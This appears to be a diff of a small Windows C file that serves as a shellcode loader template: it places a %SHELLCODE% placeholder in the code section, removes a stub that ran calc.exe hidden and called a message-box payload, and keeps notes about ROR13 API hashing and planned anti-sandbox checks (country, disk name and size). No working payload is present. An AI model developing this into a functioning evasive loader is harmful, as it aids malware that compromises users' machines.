@@ -1,5 +1,15 @@
 #include <windows.h>
-// #include <config.h>
+#include <config.h>
+
+__attribute__((section(".text"))) %SHELLCODE%
+int CALLBACK
+WinMain(HINSTANCE Instance,
+        HINSTANCE PrevInstance,
+        LPSTR CommandLine,
+        int ShowCode)
+{
+    return(0);
+}
 
 /*
 https://asecuritysite.com/hash/ror13
@@ -19,11 +29,3 @@ loader.c
 anti-s.c (pays, disquedur (nom,taille)...)
 
 */
-
-__attribute__((section(".text"))) %SHELLCODE%
-
-int WINAPI() {
-    ShellExecute(0, "open", "calc.exe", 0, 0, SW_HIDE);
-    ((void (*)())msgbox_payload)();
-    return 0;
-}
